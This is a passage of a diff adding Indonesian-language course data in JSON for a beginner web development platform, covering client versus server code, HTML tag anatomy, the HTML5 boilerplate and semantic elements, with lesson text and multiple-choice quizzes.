+        "level": "BEGINNER",
+        "estimatedMinutes": 12,
+        "description": "Membedakan mana kode yang berjalan di browser pengguna dan mana yang dieksekusi secara aman di server.",
+        "prerequisites": [
+          "protokol-http-dan-https"
+        ],
+        "learningObjectives": [
+          "Membedakan lingkungan eksekusi antara Client-Side (Frontend) dan Server-Side (Backend).",
+          "Menjelaskan alasan keamanan mengapa logika sensitif dan basis data harus berada di server.",
+          "Memahami peran API sebagai jembatan data antara Frontend dan Backend."
+        ],
+        "whyMatters": "Mengetahui di mana sebuah kode dieksekusi adalah kunci dalam merancang aplikasi web yang cepat, responsif, dan aman dari celah manipulasi.",
+        "careerContext": "Memahami batas Client dan Server adalah pondasi mutlak untuk menjadi Fullstack Web Developer yang kompeten.",
+        "commonMistakes": [
+          "Menaruh rahasia sensitif (seperti database password atau API secret key) di dalam kode Client-Side JavaScript.",
+          "Hanya mengandalkan validasi di browser tanpa melakukan validasi ulang di sisi server."
+        ],
+        "keyTerms": [
+          {
+            "term": "Client-Side (Frontend)",
+            "definition": "Bagian aplikasi yang dieksekusi langsung di perangkat pengguna (browser) menggunakan HTML, CSS, dan JS."
+          },
+          {
+            "term": "Server-Side (Backend)",
+            "definition": "Bagian aplikasi yang dieksekusi di komputer server jarak jauh (Node.js, database, logic engine)."
+          },
+          {
+            "term": "API (Application Programming Interface)",
+            "definition": "Antarmuka terstruktur yang memungkinkan Frontend meminta dan menerima data dari Backend."
+          },
+          {
+            "term": "Zero Trust Client Input",
+            "definition": "Prinsip keamanan yang melarang server mempercayai data kiriman client tanpa validasi ulang di backend."
+          }
+        ],
+        "contentMd": "# Client-Side (Frontend) vs Server-Side (Backend)\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari perbedaan arsitektur antara kode yang berjalan di perangkat pengguna (**Client-Side / Frontend**) dan kode yang berjalan di server terpusat (**Server-Side / Backend**), serta bagaimana keduanya berkolaborasi melalui **API**.\n\n## Mengapa Konsep Ini Penting?\nSebuah website modern bukan sekadar satu file kode utuh. Ada bagian yang berfokus pada pengalaman visual pengguna, dan ada bagian yang bertugas menjaga keamanan data perbankan atau akun. Mengetahui tempat yang tepat untuk mengeksekusi kode mencegah bug fatal dan kebocoran keamanan.\n\n## Konsep Utama: Pembagian Lingkungan Eksekusi\n\n### 1. Client-Side (Sisi Klien / Frontend)\n- **Tempat Eksekusi**: Langsung di dalam browser perangkat pengguna (laptop, tablet, HP).\n- **Teknologi Utama**: HTML, CSS, JavaScript (React, Next.js client components).\n- **Fokus Utama**: Menampilkan antarmuka pengguna (UI), tata letak responsif, animasi, menangkap klik tombol, dan menyajikan formulir.\n- **Karakteristik Keamanan**: **Tidak aman untuk data rahasia**. Seluruh kode JavaScript di browser dapat dilihat, diinspeksi, dan dimodifikasi oleh pengguna melalui Developer Tools.\n\n### 2. Server-Side (Sisi Server / Backend)\n- **Tempat Eksekusi**: Di komputer server terpusat di cloud datacenter.\n- **Teknologi Utama**: Node.js, Python, PostgreSQL, Prisma ORM, Redis.\n- **Fokus Utama**: Menjalankan logika bisnis, memeriksa autentikasi password, memproses transaksi pembayaran, dan membaca/menulis ke database.\n- **Karakteristik Keamanan**: **Sangat aman dan terisolasi**. Pengguna luar tidak dapat melihat kode sumber atau isi database backend secara langsung.\n\n## Bagaimana Keduanya Berkomunikasi? (Peran API)\nFrontend dan Backend bekerja sama melalui jembatan yang disebut **API (Application Programming Interface)**:\n1. Pengguna mengetik username dan password di formulir login (Client-Side).\n2. Frontend membungkus data tersebut dan mengirimkannya via HTTP POST request ke endpoint API `/api/login`.\n3. Backend (Server-Side) menerima request, mencocokkan password terenkripsi di database, dan menghasilkan token login.\n4. Backend mengirimkan response JSON `{ \"success\": true }` kembali ke Frontend.\n5. Frontend menerima konfirmasi dan mengarahkan pengguna ke halaman dashboard.\n\n## Prinsip Keamanan Wajib: \"Never Trust Client Input\"\nKarena kode di sisi klien dapat dimanipulasi oleh siapa saja, semua validasi harga barang, hak akses admin, dan perhitungan sensitif **WAJIB** diverifikasi ulang di sisi server. Validasi di browser hanya bertujuan untuk memberikan pengalaman pengguna yang cepat, bukan sebagai benteng keamanan utama.\n\n## Kesalahan Umum Pemula\n- **Menyimpan Secret Key di Client**: Menuliskan password database langsung di variabel JavaScript frontend. Siapapun yang membuka tab *Inspect Element* dapat membaca password tersebut.\n\n## Praktik Mandiri\n1. Buka website toko online atau media sosial favorit Anda.\n2. Identifikasi bagian mana yang merupakan Client-Side (tombol keranjang, animasi menu) dan mana yang diproses di Server-Side (verifikasi saldo, data riwayat transaksi).\n\n## Ringkasan\n- **Client-Side (Frontend)** berjalan di browser pengguna dan fokus pada antarmuka visual.\n- **Server-Side (Backend)** berjalan di server cloud dan fokus pada keamanan data, database, dan logika bisnis.\n- Keduanya berkomunikasi secara terstruktur menggunakan **API**.\n- Jangan pernah menyimpan data rahasia di Client-Side karena kode browser dapat diinspeksi oleh pengguna.",
+        "quizzes": [
+          {
+            "id": "q-1-5-1",
+            "question": "Manakah teknologi berikut yang dieksekusi secara eksklusif di sisi Client-Side (browser pengguna)?",
+            "options": [
+              "HTML, CSS, dan DOM JavaScript",
+              "PostgreSQL dan Prisma ORM",
+              "Linux Server Kernel",
+              "Docker Container"
+            ],
+            "correctIndex": 0,
+            "explanation": "HTML, CSS, dan JavaScript dieksekusi langsung oleh engine browser perangkat lokal pengguna untuk merender tampilan visual."
+          },
+          {
+            "id": "q-1-5-2",
+            "question": "Mengapa logika sensitif seperti validasi transaksi pembayaran dan pencocokan password WAJIB dijalankan di Server-Side?",
+            "options": [
+              "Karena kode Client-Side dapat diinspeksi, diubah, dan dimanipulasi secara bebas oleh pengguna melalui browser DevTools.",
+              "Karena browser komputer tidak memiliki memori untuk menjalankan perhitungan matematika.",
+              "Karena bahasa CSS tidak dapat membaca teks formulir password.",
+              "Karena server cloud lebih murah daripada browser klien."
+            ],
+            "correctIndex": 0,
+            "explanation": "Prinsip Zero Trust Client Input: kode di browser dapat diubah oleh pengguna, sehingga otorisasi dan transaksi wajib divalidasi di server yang aman."
+          },
+          {
+            "id": "q-1-5-3",
+            "question": "Dalam arsitektur web modern, apa fungsi utama dari API (Application Programming Interface)?",
+            "options": [
+              "Sebagai jembatan protokol pertukaran data terstruktur (misal: format JSON) antara antarmuka Frontend dan logika bisnis Backend.",
+              "Untuk menggantikan fungsi CSS dalam mengatur warna tombol.",
+              "Untuk mengunci jendela browser agar pengguna tidak bisa membuka aplikasi lain.",
+              "Sebagai pengganti kabel fisik koneksi internet."
+            ],
+            "correctIndex": 0,
+            "explanation": "API memungkinkan Frontend mengirim permintaan data dan menerima respon dari Backend secara terstandarisasi."
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "stage-2",
+    "orderIndex": 2,
+    "titleId": "HTML5 Semantic & Accessibility",
+    "titleEn": "HTML5 Semantic & Accessibility",
+    "category": "Fundamentals",
+    "description": "Membangun struktur dokumen web yang kokoh, rapi, ramah SEO, dan dapat diakses pembaca layar (Screen Reader).",
+    "descriptionEn": "Build solid, tidy, SEO-friendly web document structures accessible to screen readers.",
+    "lessons": [
+      {
+        "id": "lesson-2-1",
+        "stageId": "stage-2",
+        "slug": "anatomi-tag-dan-elemen-html",
+        "title": "Anatomi Tag & Elemen HTML",
+        "titleEn": "Anatomy of HTML Tags & Elements",
+        "level": "BEGINNER",
+        "estimatedMinutes": 12,
+        "description": "Mengenal tag pembuka, tag penutup, konten, atribut, nesting, dan void elements pada dokumen HTML.",
+        "prerequisites": [
+          "perbedaan-client-side-vs-server-side"
+        ],
+        "learningObjectives": [
+          "Membedakan konsep antara tag pembuka, tag penutup, konten, dan elemen HTML utuh.",
+          "Menjelaskan fungsi atribut HTML serta format penulisan pasangan nama dan nilainya.",
+          "Memahami aturan penumpukan elemen bersarang (nesting) yang benar.",
+          "Mengidentifikasi elemen tanpa penutup (void elements / self-closing)."
+        ],
+        "whyMatters": "Kesalahan dasar seperti lupa menutup tag atau nesting yang saling tumpang tindih dapat merusak tampilan layout dan menyulitkan manipulasi DOM oleh JavaScript.",
+        "careerContext": "Menulis HTML yang valid dan bersih adalah standar higienitas paling mendasar yang dinilai dalam technical test developer.",
+        "commonMistakes": [
+          "Menutup tag secara bersilangan (*improper nesting*), contoh: `<b><i>teks</b></i>` yang seharusnya `<b><i>teks</i></b>`.",
+          "Lupa menyertakan tanda kutip pada nilai atribut, contoh: `class=teks utama` yang memecah nama class."
+        ],
+        "keyTerms": [
+          {
+            "term": "Tag",
+            "definition": "Tanda kurung sudut `<...>` yang digunakan untuk menandai awal dan akhir sebuah instruksi markah."
+          },
+          {
+            "term": "Element",
+            "definition": "Satu unit utuh yang terdiri dari tag pembuka, atribut, konten isi, dan tag penutup."
+          },
+          {
+            "term": "Attribute",
+            "definition": "Informasi atau konfigurasi tambahan yang diletakkan di dalam tag pembuka (contoh: `class=\"utama\"`)."
+          },
+          {
+            "term": "Void Element",
+            "definition": "Elemen HTML yang tidak memiliki konten isi dan tidak memerlukan tag penutup (contoh: `<img>`, `<input>`, `<br>`)."
+          }
+        ],
+        "contentMd": "# Anatomi Tag & Elemen HTML\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari anatomi dasar pembentuk dokumen HTML: perbedaan antara **tag**, **elemen**, **konten**, **atribut**, aturan **nesting** (elemen bersarang), serta **void elements**.\n\n## Mengapa Konsep Ini Penting?\nHTML adalah bahasa markah (*markup language*). Browser membaca instruksi tag untuk memahami apakah sebuah teks harus ditampilkan sebagai paragraf, judul tebal, atau tombol. Tanpa memahami struktur anatominya, dokumen web Anda akan mudah mengalami kerusakan tata letak.\n\n## Konsep Utama: Anatomi Elemen HTML\nPerhatikan struktur sebuah elemen HTML berikut:\n\n```html\n<p class=\"teks-informasi\" id=\"paragraf-1\">Belajar HTML itu mudah dan terstruktur.</p>\n```\n\nElemen di atas terdiri dari 4 bagian utama:\n1. **Tag Pembuka (`<p ...>`)**: Menandai awal dari elemen paragraf.\n2. **Atribut (`class=\"teks-informasi\"` dan `id=\"paragraf-1\"`)**: Memberikan informasi tambahan atau pengenal pada elemen. Atribut selalu diletakkan di dalam tag pembuka dengan format `nama=\"nilai\"`.\n3. **Konten (`Belajar HTML itu mudah dan terstruktur.`)**: Teks atau elemen lain yang berada di dalam tag pembuka dan penutup.\n4. **Tag Penutup (`</p>`)**: Menandai akhir dari elemen paragraf (diawali tanda garis miring `/`).\n\n> **Penting**: Kombinasi lengkap dari tag pembuka, atribut, konten, hingga tag penutup disebut sebagai **Elemen HTML**.\n\n## Elemen Bersarang (Nesting Rules)\nElemen HTML dapat dimasukkan ke dalam elemen lain. Aturan bakunya adalah: **elemen yang dibuka terakhir harus ditutup terlebih dahulu (Last-In, First-Out)**.\n\nContoh yang **BENAR**:\n```html\n<p>Ini adalah teks <strong>tebal dan <em>miring</em></strong> di dalam paragraf.</p>\n```\n\nContoh yang **SALAH** (Nesting tumpang tindih):\n```html\n<!-- SALAH: <strong> dibuka duluan tetapi ditutup belakangan -->\n<p>Ini adalah teks <strong>tebal dan <em>miring</strong></em> di dalam paragraf.</p>\n```\n\n## Void Elements (Elemen Tanpa Penutup)\nBeberapa elemen HTML tidak membungkus konten teks, sehingga tidak memiliki tag penutup terpisah. Elemen ini disebut **Void Elements**.\n\nContoh void elements umum:\n- `<img>`: Menampilkan gambar (konten berasal dari atribut `src`).\n- `<input>`: Menampilkan kolom input formulir.\n- `<br>`: Menambahkan jeda baris baru (*line break*).\n- `<hr>`: Garis pemisah horizontal.\n\n```html\n<img src=\"/foto.jpg\" alt=\"Pemandangan gunung\" />\n<input type=\"text\" placeholder=\"Ketik nama Anda...\" />\n```\n\n## Kesalahan Umum Pemula\n- **Menyamakan istilah Tag dan Elemen**: Tag hanya kodenya saja (`<p>` atau `</p>`), sedangkan elemen adalah unit keseluruhan termasuk isi kontennya.\n- **Lupa menutup tag non-void**: Lupa menuliskan `</div>` atau `</p>` yang menyebabkan styling pada elemen berikutnya ikut rusak.\n\n## Praktik Mandiri\n1. Tulis sebuah elemen link `<a>` yang memiliki atribut `href=\"https://belajarinaja.com\"`, teks konten `Kunjungi BelajarinAja`, dan membungkus kata \"BelajarinAja\" dengan tag `<strong>`.\n2. Pastikan aturan nesting ditutup dengan urutan yang benar.\n\n## Ringkasan\n- **Tag** adalah penanda kurung sudut (`<tag>` dan `</tag>`).\n- **Elemen** adalah gabungan utuh dari tag pembuka, atribut, konten, dan tag penutup.\n- **Atribut** memberikan konfigurasi tambahan pada tag pembuka dalam format `nama=\"nilai\"`.\n- **Nesting** mewajibkan elemen terdalam ditutup terlebih dahulu sebelum elemen pembungkus luarnya.\n- **Void elements** (seperti `<img>` dan `<input>`) tidak memerlukan tag penutup terpisah.",
+        "quizzes": [
+          {
+            "id": "q-2-1-1",
+            "question": "Berdasarkan anatomi elemen HTML, manakah pernyataan yang paling tepat membedakan antara 'Tag' dan 'Elemen'?",
+            "options": [
+              "Tag adalah penanda kurung sudut (<p> atau </p>), sedangkan Elemen adalah unit utuh yang mencakup tag pembuka, atribut, konten, hingga tag penutup.",
+              "Tag hanya digunakan untuk gambar sedangkan Elemen hanya digunakan untuk teks.",
+              "Tag ditulis di file CSS sedangkan Elemen ditulis di file JavaScript.",
+              "Tag dan Elemen adalah sinonim yang artinya persis sama tanpa perbedaan teknis."
+            ],
+            "correctIndex": 0,
+            "explanation": "Tag merujuk pada penanda sintaksis (<p> dan </p>), sedangkan Elemen merujuk pada kesatuan utuh komponen beserta isi konten dan atributnya."
+          },
+          {
+            "id": "q-2-1-2",
+            "question": "Di bagian manakah atribut HTML (seperti class, id, atau src) WAJIB diletakkan?",
+            "options": [
+              "Di dalam Tag Pembuka elemen (contoh: <p class=\"info\">).",
+              "Di dalam Tag Penutup elemen (contoh: </p class=\"info\">).",
+              "Di antara teks konten paragraf.",
+              "Di baris paling bawah dokumen HTML."
+            ],
+            "correctIndex": 0,
+            "explanation": "Atribut selalu disematkan di dalam tag pembuka dengan format nama=\"nilai\" sebelum kurung siku penutup >."
+          },
+          {
+            "id": "q-2-1-3",
+            "question": "Perhatikan potongan kode HTML berikut:\n<p>Belajar <strong>HTML <em>sangat</em> mudah</strong> bersama kami.</p>\nManakah urutan penutupan tag yang benar sesuai prinsip nesting?",
+            "options": [
+              "Tag <em> ditutup terlebih dahulu (</em>), diikuti penutupan <strong> (</strong>), lalu diakhiri penutupan <p> (</p>).",
+              "Tag <p> harus ditutup paling pertama sebelum <em>.",
+              "Semua tag penutup dapat ditulis dalam urutan acak bebas.",
+              "Tag <strong> tidak perlu ditutup jika sudah ada <em>."
+            ],
+            "correctIndex": 0,
+            "explanation": "Prinsip Last-In First-Out: elemen terdalam (<em>) harus ditutup terlebih dahulu sebelum elemen induknya (<strong> dan <p>)."
+          },
+          {
+            "id": "q-2-1-4",
+            "question": "Manakah di antara tag HTML berikut yang merupakan contoh 'Void Element' (elemen tanpa tag penutup)?",
+            "options": [
+              "<img src=\"gambar.jpg\" alt=\"Deskripsi\">",
+              "<p>Ini adalah paragraf</p>",
+              "<button>Klik Saya</button>",
+              "<h1>Judul Utama</h1>"
+            ],
+            "correctIndex": 0,
+            "explanation": "Tag <img> adalah void element karena tidak membungkus konten teks dan tidak membutuhkan tag penutup </img> terpisah."
+          }
+        ]
+      },
+      {
+        "id": "lesson-2-2",
+        "stageId": "stage-2",
+        "slug": "kerangka-dokumen-html5-standar",
+        "title": "Kerangka Standar Dokumen HTML5",
+        "titleEn": "Standard HTML5 Document Structure",
+        "level": "BEGINNER",
+        "estimatedMinutes": 15,
+        "description": "Menyusun struktur dokumen HTML5 yang valid menggunakan <!DOCTYPE html>, <html>, <head>, <meta charset>, <meta viewport>, dan <body>.",
+        "prerequisites": [
+          "anatomi-tag-dan-elemen-html"
+        ],
+        "learningObjectives": [
+          "Menjelaskan fungsi deklarasi <!DOCTYPE html> dalam mencegah Quirks Mode browser.",
+          "Menyusun struktur pohon dokumen HTML5 lengkap dari root <html> hingga <body>.",
+          "Menjelaskan peran metadata di dalam elemen <head> (charset UTF-8, viewport, title).",
+          "Membedakan fungsi penampung metadata (<head>) dengan penampung konten visual (<body>)."
+        ],
+        "whyMatters": "Tanpa kerangka HTML5 yang tepat, browser mobile tidak akan merespons skala layar dengan baik dan karakter huruf khusus dapat rusak (encoding glitch).",
+        "careerContext": "Semua template web modern di Next.js, Vite, atau HTML murni selalu berpijak pada standar boilerplate HTML5 ini.",
+        "commonMistakes": [
+          "Lupa menyertakan tag `<meta name=\"viewport\">` sehingga website tampil sangat kecil seperti halaman desktop jadul di smartphone.",
+          "Menaruh tag visual seperti `<h1>` atau `<p>` di dalam elemen `<head>` yang seharusnya khusus untuk metadata."
+        ],
+        "keyTerms": [
+          {
+            "term": "<!DOCTYPE html>",
+            "definition": "Deklarasi tipe dokumen yang menginstruksikan browser agar merender halaman menggunakan standar HTML5 modern."
+          },
+          {
+            "term": "<html>",
+            "definition": "Elemen root tertinggi yang membungkus seluruh dokumen web."
+          },
+          {
+            "term": "<head>",
+            "definition": "Wadah penampung metadata dokumen, judul tab, font, dan stylesheet yang tidak tampil langsung di layar konten."
+          },
+          {
+            "term": "<body>",
+            "definition": "Wadah penampung seluruh konten visual yang dilihat dan diinteraksikan oleh pengguna."
+          },
+          {
+            "term": "Viewport",
+            "definition": "Area tampilan layar perangkat yang digunakan browser untuk mengukur skala render konten."
+          }
+        ],
+        "contentMd": "# Kerangka Standar Dokumen HTML5\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari cara menyusun kerangka dasar dokumen HTML5 yang valid dan profesional: mulai dari deklarasi `<!DOCTYPE html>`, elemen root `<html>`, bagian metadata `<head>`, hingga bagian konten visual `<body>`.\n\n## Mengapa Konsep Ini Penting?\nBrowser memerlukan petunjuk pasti mengenai versi standar HTML yang Anda gunakan dan bagaimana teks harus di-encode. Dokumen yang tidak memiliki kerangka standar dapat masuk ke dalam mode kompatibilitas usang (*Quirks Mode*) yang membuat styling CSS tampil rusak dan kacau.\n\n## Struktur Lengkap Dokumen HTML5\nBerikut adalah struktur dasar (*boilerplate*) standar yang wajib dimiliki oleh setiap halaman web modern:\n\n```html\n<!DOCTYPE html>\n<html lang=\"id\">\n  <head>\n    <meta charset=\"UTF-8\" />\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\n    <title>BelajarinAja - Platform Belajar Web</title>\n  </head>\n  <body>\n    <h1>Selamat Datang di BelajarinAja</h1>\n    <p>Ini adalah konten utama yang tampil di layar pengguna.</p>\n  </body>\n</html>\n```\n\n## Penjelasan Komponen Baris demi Baris\n\n### 1. `<!DOCTYPE html>`\n- Berada di baris paling awal sebelum tag apapun.\n- Bukan tag HTML, melainkan instruksi deklarasi kepada browser bahwa dokumen ini menggunakan standar **HTML5 Modern (Standards Mode)**.\n- Mencegah browser jatuh ke mode kuno (*Quirks Mode*).\n\n### 2. `<html lang=\"id\">`\n- Elemen root pembungkus seluruh halaman.\n- Atribut `lang=\"id\"` memberitahu browser dan mesin pencari bahwa bahasa utama dokumen adalah Bahasa Indonesia (sangat penting untuk aksesibilitas screen reader dan SEO).\n\n### 3. Bagian `<head>` (Metadata Dokumen)\nBagian ini menyimpan informasi untuk browser dan mesin pencari, bukan konten visual:\n- **`<meta charset=\"UTF-8\" />`**: Menentukan pengkodean karakter universal UTF-8 agar seluruh huruf, simbol matematika, dan emoji (seperti 👋, 🚀) tampil sempurna tanpa error karakter aneh (*mojibake*).\n- **`<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />`**: Pondasi responsive design. Menginstruksikan browser ponsel agar menyesuaikan lebar halaman dengan lebar fisik layar gadget (bukan merender dalam skala desktop 980px yang mengecilkan teks).\n- **`<title>`**: Menentukan judul yang tampil pada tab browser dan hasil pencarian Google.\n\n### 4. Bagian `<body>` (Konten Visual)\n- Menampung seluruh elemen yang tampil secara visual pada layar pengguna: judul (`<h1>`), paragraf (`<p>`), gambar (`<img>`), navbar, dan footer.\n\n## Kesalahan Umum Pemula\n- **Menaruh elemen konten di dalam `<head>`**: Menulis teks atau tombol di dalam `<head>` melanggar spesifikasi HTML dan merusak pohon DOM browser.\n- **Lupa menyertakan `<meta charset=\"UTF-8\">`**: Mengakibatkan simbol kutip atau karakter bahasa lokal berubah menjadi tanda tanya (``).\n\n## Praktik Mandiri\n1. Buat sebuah file baru bernama `index.html`.\n2. Tulis kerangka dokumen HTML5 lengkap seperti contoh di atas.\n3. Ubah isi tag `<title>` dengan nama portofolio Anda dan tambahkan satu paragraf di dalam `<body>`.\n4. Buka file tersebut di browser Google Chrome dan perhatikan judul pada tab browser Anda.\n\n## Ringkasan\n- Dokumen HTML5 selalu diawali deklarasi **`<!DOCTYPE html>`**.\n- Dokumen terbagi menjadi dua bagian besar: **`<head>`** (metadata) dan **`<body>`** (konten visual).\n- **`<meta charset=\"UTF-8\">`** memastikan encoding karakter aman.\n- **`<meta name=\"viewport\">`** wajib untuk mendukung tampilan responsive di smartphone.",
+        "quizzes": [
+          {
+            "id": "q-2-2-1",
+            "question": "Apa fungsi dari deklarasi <!DOCTYPE html> pada baris paling awal dokumen HTML5?",
+            "options": [
+              "Memberitahu browser untuk merender halaman sesuai standar modern HTML5 (Standards Mode), bukan Quirks Mode.",
+              "Mengunduh file CSS secara otomatis dari server cloud Google.",
+              "Mengunci dokumen agar tidak bisa diedit oleh pengguna lain.",
+              "Menghubungkan dokumen HTML dengan database server backend."
+            ],
+            "correctIndex": 0,
+            "explanation": "Deklarasi DOCTYPE memastikan browser merender elemen dengan standar HTML5 modern tanpa memasuki mode kompatibilitas usang (quirks mode)."
+          },
+          {
+            "id": "q-2-2-2",
+            "question": "Di dalam elemen manakah tag <meta charset=\"UTF-8\">, <meta name=\"viewport\">, dan <title> harus diletakkan?",
+            "options": [
+              "<head>",
+              "<body>",
+              "<footer>",
+              "<main>"
+            ],
+            "correctIndex": 0,
+            "explanation": "Elemen <head> khusus menyimpan metadata dokumen, konfigurasi encoding karakter, konfigurasi viewport, dan judul tab browser."
+          },
+          {
+            "id": "q-2-2-3",
+            "question": "Mengapa tag <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"> sangat krusial bagi website modern?",
+            "options": [
+              "Agar browser mobile merender lebar halaman sesuai lebar layar perangkat smartphone dan tidak mengecilkan teks secara otomatis (zoom out desktop).",
+              "Untuk mengubah tema halaman menjadi Dark Mode secara otomatis.",
+              "Untuk mengaktifkan fitur animasi 3D di CSS.",
+              "Agar halaman web dapat dibuka tanpa koneksi internet."
+            ],
+            "correctIndex": 0,
+            "explanation": "Tag viewport adalah pondasi dasar responsive web design agar konten disesuaikan dengan skala lebar layar smartphone dan tablet."
+          },
+          {
+            "id": "q-2-2-4",
+            "question": "Elemen manakah yang bertugas menampung seluruh konten visual (seperti teks paragraf, tombol, dan gambar) yang dilihat langsung oleh pengguna?",
+            "options": [
+              "<body>",
+              "<head>",
+              "<title>",
+              "<!DOCTYPE>"
+            ],
+            "correctIndex": 0,
+            "explanation": "Semua elemen visual yang tampil di antarmuka browser wajib diletakkan di dalam kontainer <body>."
+          }
+        ]
+      },
+      {
+        "id": "lesson-2-3",
+        "stageId": "stage-2",
+        "slug": "elemen-semantik-modern",
+        "title": "Elemen Semantik Modern (header, nav, main, article, footer)",
+        "titleEn": "Modern Semantic Elements",
+        "level": "BEGINNER",
+        "estimatedMinutes": 15,
+        "description": "Mengganti <div> generik dengan tag semantik HTML5 (<header>, <nav>, <main>, <section>, <article>, <aside>, <footer>) untuk struktur SEO dan aksesibilitas.",
+        "prerequisites": [
+          "kerangka-dokumen-html5-standar"
+        ],
+        "learningObjectives": [
+          "Menjelaskan perbedaan antara elemen semantik (bermakna) dan non-semantik (generik seperti <div>/<span>).",
+          "Memilih tag semantik yang tepat untuk setiap zona layout website (<header>, <nav>, <main>, <article>, <section>, <aside>, <footer>).",
+          "Menjelaskan manfaat elemen semantik untuk SEO dan teknologi pembaca layar (Screen Reader)."
+        ],
+        "whyMatters": "Search engine dan screen reader mengandalkan tag semantik untuk memahami hierarki dan bagian terpenting dari sebuah halaman web.",
+        "careerContext": "Standar kode industri modern melarang 'Div Soup' (menumpuk ratusan tag div tanpa makna semantik).",
+        "commonMistakes": [
+          "Menggunakan lebih dari satu tag `<main>` untuk konten utama dalam satu halaman.",
+          "Membungkus semua elemen menggunakan `<div>` polos sehingga menyulitkan pembaca layar membedakan navigasi dan artikel."
+        ],
+        "keyTerms": [
+          {
+            "term": "Semantic HTML",
+            "definition": "Elemen HTML yang namanya secara jelas mendeskripsikan arti dan fungsinya kepada browser dan developer."
+          },
+          {
+            "term": "<header>",
+            "definition": "Zona kepala halaman atau pembungkus judul pengantar artikel."
+          },
+          {
+            "term": "<nav>",
+            "definition": "Zona khusus untuk menampung kumpulan tautan navigasi utama website."
+          },
+          {
+            "term": "<main>",
+            "definition": "Konten unik utama dari dokumen (hanya boleh ada 1 per halaman)."
+          },
+          {
+            "term": "<article>",
+            "definition": "Komposisi konten mandiri yang dapat didistribusikan atau digunakan ulang (seperti postingan blog atau kartu berita)."
+          },
+          {
+            "term": "<footer>",
+            "definition": "Zona kaki halaman yang memuat hak cipta, tautan kebijakan privasi, atau informasi kontak."
+          }
+        ],
+        "contentMd": "# Elemen Semantik Modern (header, nav, main, article, footer)\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari konsep **Semantic HTML5**: mengapa mengganti elemen generik `<div>` dengan elemen yang memiliki makna (`<header>`, `<nav>`, `<main>`, `<article>`, `<section>`, `<aside>`, `<footer>`) sangat penting bagi Search Engine (SEO) dan Aksesibilitas (Screen Reader).\n\n## Mengapa Konsep Ini Penting?\nElemen `<div>` dan `<span>` adalah elemen non-semantik: browser dan mesin pencari tidak tahu apakah sebuah `<div>` berisi navigasi menu, iklan sampingan, atau artikel utama. Dengan tag semantik, struktur halaman menjadi kaya makna (*meaningful structure*).\n\n## Perbandingan Elemen Semantik vs Non-Semantik\n\n| Tag Semantik | Fungsi Spesifik | Contoh Penggunaan |\n| :--- | :--- | :--- |\n| **`<header>`** | Bagian kepala halaman atau pengantar artikel | Logo website, judul artikel, waktu publikasi |\n| **`<nav>`** | Kumpulan tautan navigasi utama | Menu bar navigasi atas, daftar link halaman |\n| **`<main>`** | Konten unik utama dari dokumen | Isi inti halaman (hanya 1 `<main>` per halaman) |\n| **`<article>`** | Konten mandiri yang utuh (*standalone*) | Postingan blog, kartu produk, komentar pengguna |\n| **`<section>`** | Kelompok konten tematik yang berhubungan | Bagian fitur aplikasi, bagian testimoni pelanggan |\n| **`<aside>`** | Konten pendukung/sampingan yang terpisah | Sidebar informasi profil penulis, banner promo |\n| **`<footer>`** | Bagian penutup/kaki halaman | Teks hak cipta, kontak bantuan, link syarat & ketentuan |\n\n## Contoh Struktur Layout Semantik Bersih\n\n```html\n<body>\n  <!-- 1. Header & Navigasi -->\n  <header>\n    <div class=\"logo\">BelajarinAja</div>\n    <nav>\n      <ul>\n        <li><a href=\"/\">Beranda</a></li>\n        <li><a href=\"/roadmap\">Roadmap</a></li>\n        <li><a href=\"/dashboard\">Dashboard</a></li>\n      </ul>\n    </nav>\n  </header>\n\n  <!-- 2. Konten Utama -->\n  <main>\n    <article>\n      <h1>Belajar Semantic HTML5</h1>\n      <p>Elemen semantik membuat web lebih inklusif dan mudah diindeks Google.</p>\n    </article>\n\n    <aside>\n      <h3>Tentang Penulis</h3>\n      <p>Acelino - Founder & Frontend Specialist.</p>\n    </aside>\n  </main>\n\n  <!-- 3. Kaki Halaman -->\n  <footer>\n    <p>&copy; 2026 BelajarinAja. Hak Cipta Dilindungi.</p>\n  </footer>\n</body>\n```\n\n## Keuntungan Utama Semantic HTML\n1. **Aksesibilitas (a11y)**: Pengguna tunanetra yang memakai Screen Reader dapat langsung menekan pintasan keyboard untuk melompat ke `<main>` atau `<nav>` tanpa harus mendengarkan pembacaan seluruh elemen dari atas.\n2. **SEO (Search Engine Optimization)**: Googlebot dapat membedakan mana konten inti artikel (`<article>`) dan mana yang sekadar navigasi atau footer.\n3. **Keterbacaan Kode (Maintainability)**: Developer dalam tim dapat memahami struktur halaman dalam hitungan detik tanpa harus membaca class CSS yang rumit.\n\n## Kesalahan Umum Pemula\n- **Penyakit 'Div Soup'**: Membungkus seluruh komponen dengan `<div class=\"header\">`, `<div class=\"nav\">`, `<div class=\"footer\">` alih-alih memakai tag bawaan HTML5 yang sudah ada.\n- **Menggunakan lebih dari satu `<main>`**: Dokumen HTML hanya diizinkan memiliki tepat 1 elemen `<main>` sebagai konten primer.\n\n## Praktik Mandiri\n1. Buat kerangka halaman blog sederhana yang memuat `<header>`, `<nav>`, `<main>` berisi 2 `<article>`, dan sebuah `<footer>`.\n2. Pastikan tidak ada `<div>` yang digunakan jika sudah ada tag semantik yang sesuai.\n\n## Ringkasan\n- **Semantic HTML** menggunakan tag yang mendeskripsikan perannya secara eksplisit.\n- **`<header>`**, **`<nav>`**, **`<main>`**, **`<article>`**, **`<section>`**, **`<aside>`**, dan **`<footer>`** memberikan struktur yang jelas bagi mesin pencari dan teknologi asistif.\n- Hindari *Div Soup* untuk menjaga kualitas aksesibilitas dan performa SEO.",
+        "quizzes": [
+          {
+            "id": "q-2-3-1",
+            "question": "Manakah tag semantik HTML5 yang paling tepat digunakan untuk membungkus daftar tautan navigasi utama website?",
+            "options": [
+              "<nav>",
+              "<div>",
+              "<menu-links>",
+              "<navigation-bar>"
+            ],
+            "correctIndex": 0,
+            "explanation": "Tag <nav> dirancang khusus secara semantik untuk menandai zona kumpulan tautan navigasi utama pada halaman web."
+          },
+          {
+            "id": "q-2-3-2",
